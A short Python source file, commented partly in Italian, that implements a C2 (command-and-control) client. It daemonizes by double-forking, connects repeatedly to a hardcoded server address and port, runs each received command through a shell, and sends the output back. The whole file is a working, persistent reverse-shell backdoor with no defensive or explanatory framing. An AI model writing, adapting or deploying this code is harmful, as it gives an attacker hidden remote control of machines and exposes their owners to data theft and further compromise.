import socket
import subprocess
import time
import os
import sys

def daemonize():
    """Run the client in the background by forking the process."""
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        print(f"[!] Fork failed: {e}")
        sys.exit(1)

    os.setsid()

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        print(f"[!] Second fork failed: {e}")
        sys.exit(1)

def connect_to_server():
    """Connect to the C2 server and handle commands."""
    current_dir = os.getcwd()  # Mantieni la directory corrente del client

    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('192.168.1.6', 5666))  # Cambia con l'IP del tuo server
            print("[*] Connected to C2 server")

            while True:
                command = client.recv(4096).decode('utf-8', errors='ignore')
                if not command:
                    break

                try:
                    # Gestisci 'cd' separatamente
                    if command.startswith("cd "):
                        path = command[3:].strip()
                        try:
                            os.chdir(path)
                            current_dir = os.getcwd()
                            output = ""  # Nessun output per cd riuscito
                        except Exception as e:
                            output = f"Error: {e}"
                    else:
                        # Esegui comandi nella directory corrente
                        result = subprocess.run(
                            command, shell=True, capture_output=True, text=True, cwd=current_dir
                        )
                        output = result.stdout + result.stderr
                except Exception as e:
                    output = f"Error: {str(e)}"

                client.send(output.encode('utf-8'))

        except Exception as e:
            print(f"[!] Connection error: {e}")
            time.sleep(5)

        finally:
            client.close()

if __name__ == "__main__":
    daemonize()
    connect_to_server()
